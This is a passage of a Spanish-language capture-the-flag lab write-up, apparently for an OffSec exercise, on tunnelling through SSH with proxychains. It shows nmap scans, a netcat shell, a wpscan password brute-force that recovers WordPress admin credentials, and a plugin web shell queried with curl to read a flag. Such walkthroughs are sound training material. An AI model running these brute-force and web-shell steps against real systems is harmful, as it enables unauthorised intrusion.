Proxychains se aprovecha de la tunnelización SSH construida con el coamndo anterior para enviar el tráfico generado por Nmap sobre el usuario student en la máquina con IP 192.168.209.52 y este a su vez dirige los paquetes como si los hubiera enviado él, de forma que se pone en contacto con sus puertos locales en un rango del 30000 al 35000 escaneando así localmente la máquina con Nmap y devuelve el output a proxychains. 

Finalmente se descubre un servicio escuchando sobre 127.0.0.1:34023. Volvemos a utilizar proxychains para redirigir el tráfico de netcat y obtenemos una shell:

```
┌──(kali㉿kali)-[~]
└─$ proxychains nc 127.0.0.1 34023       
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:34023  ...  OK
ls
flag.txt
cat flag.txt
OS{14c62796d2eae4f37ed8f79b359acaa7}       
```

<br />

**7.  There is a WordPress instance running on the target VM #2 that is only accessible locally. The flag is not simply in a post once you log in - you need to use this administrative web to gain access to the box as _www-data_. To save you time, the admin user is _offsec_. Use your local user SSH access to forward your password attack traffic to this server to determine the admin password. Then, utilize this admin access to get a web shell and, finally, read _/home/flag.txt_ to solve this challenge. _Note_: for this exercise try different well-known wordlists. Also, make sure to block browser's DNS requests over proxychains.**

Para este caso, volvemos a escanear la máquina con Proxychains de la misma forma en la que hemos procedido en el ejercicio anterior. 

El escaneo resuelve la existencia de un puerto 80 en la máquina remota accesible localmente que tiene un portal Wordpress tal y cómo predice el enunciado del ejercicio.

```
proxychains nmap -A -n -PN 127.0.0.1 -p- --min-rate 10000

[...]

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
Nmap scan report for 127.0.0.1
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Port Forwarding Challenge &#8211; Just another WordPress site
|_http-generator: WordPress 5.8.2
|_http-server-header: Apache/2.4.51 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
```

Así, de esta forma, lanzamos firefox a través de proxychains para investigar la página:

```
proxychains firefox http://127.0.0.1:80/wp-login.php 
```

Nos encontramos con un potal de logeo común, realizamos un logeo de prueba para comprobar la reacción de la página ante un logeo inválido:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230312145715.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, inspeccionamos los parámetros de la request a través de DevTools y formamos el siguiente comando con *wpscan* a través de proxychains:

```
wpscan --update
```

<br />

```
proxychains -q wpscan --url http://127.0.0.1:80/ --usernames offsec --passwords /usr/share/wordlists/rockyou.txt

[...]

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - offsec / 555666                                                                                          
Trying offsec / missy1 Time: 00:01:02 <                                     > (1885 / 14346277)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: offsec, Password: 555666

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Mar 12 11:19:46 2023
[+] Requests Done: 2057
[+] Cached Requests: 5
[+] Data Sent: 672 KB
[+] Data Received: 12.57 MB
[+] Memory used: 272.699 MB
[+] Elapsed time: 00:01:13
```

De esta forma, hemos encontrado unas credenciales válidas y procedemos a logearnos y nos encontramos con un sitio web de Wordpress. Seguimos las indicaciones para crear un plugin malicioso con el que obtener una webshell y leer la flag.

```
proxychains firefox --new-window http://127.0.0.1:80/wp-login.php
```

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230312203151.png' | relative_url }}" text-align="center"/>
</div>

Lo activamos y empleamos curl para obtener la flag:

```
proxychains curl "http://127.0.0.1:80/wp-content/plugins/simple_shell/simple_shell.php?cmd=cat+/home/flag.txt"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:80  ...  OK
<pre>OS{4d773b497a8816027c105b13cb0a72da}</pre> 
```
